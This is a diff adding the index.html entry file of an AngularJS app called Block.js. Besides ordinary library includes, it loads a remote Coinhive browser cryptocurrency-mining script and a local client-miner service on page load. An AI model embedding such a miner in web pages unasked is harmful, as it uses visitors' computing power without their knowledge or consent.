@@ -1,0 +1,47 @@
+<!-- MAIN ENTRY FILE -->
+<!-- index.html -->
+
+<!DOCTYPE html>
+
+<!-- ASSIGN OUR ANGULAR MODULE -->
+<html ng-app="block">
+<head>
+    <!-- META -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Optimize mobile viewport -->
+
+    <title>Block.js</title>
+
+    <!-- SCROLLS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    <style>
+        html                    { overflow-y:scroll; }
+        nav                     { margin-bottom: 50px; }
+    </style>
+
+    <!-- DEPENDENCIES -->
+    <script src="bower_components/jquery/dist/jquery.min.js"></script><!-- load jquery -->
+    <script src="bower_components/angular/angular.min.js"></script>
+    <script src="bower_components/angular-ui-router/release/angular-ui-router.min.js"></script>
+    <script src="bower_components/socket.io-client/dist/socket.io.js"></script>
+    <script src="bower_components/angular-socket-io/socket.js"></script>
+    <script src="js/core.js"></script>
+    <script src="js/controllers/entry.controller.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script src="js/services/ClientMiner.factory.js"></script>
+    <script src="js/controllers/auth.controller.js"></script>
+    <script src="js/stateMap.js"></script>
+
+</head>
+
+<body>
+    <ui-view></ui-view>
+</body>
+
+<footer>
+    <!-- views/partials/footer.ejs -->
+    <p class="text-center text-muted">© Copyright 2017 S.J. Kim and Conor Quinn</p>
+</footer>
+
+
+</html>
